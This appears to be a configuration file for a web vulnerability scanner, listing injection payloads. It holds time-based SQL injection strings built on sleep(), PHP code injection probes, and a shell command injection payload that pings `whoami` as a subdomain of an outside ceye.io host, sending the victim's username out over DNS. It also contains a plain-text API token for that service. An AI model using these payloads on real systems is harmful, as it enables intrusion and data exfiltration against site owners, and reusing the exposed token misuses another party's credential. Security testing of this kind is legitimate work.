# coding=utf-8
# config file
# dict 格式存储

# sqli config

sqli_config = {
    "delay": 0,
    "sleep_time": 5,

    "payload": [
        "'xor(sleep(%d))or'",
        "\"xor(sleep(%d))or\"",
        "1 xor(sleep(%d))or'",
        ",sleep(%d)",
    ]
}


# code&command inject config

code_inject_config = {
    "delay": 0,
    "sleep_time": 5,
    
    "payload": [
        "1 xor(print(%s*%s))",
        "'.(print(%s*%s)).'",
        "\".(print(%s*%s)).\"",
    ]
}

command_inject_config = {
    "ceye_host": "mw5aad.ceye.io",
    "ceye_api": "46238220ecd975a96d946dd0c4c63fe4",

    "payload": ["$(ping `whoami`.%s.%s)"]
}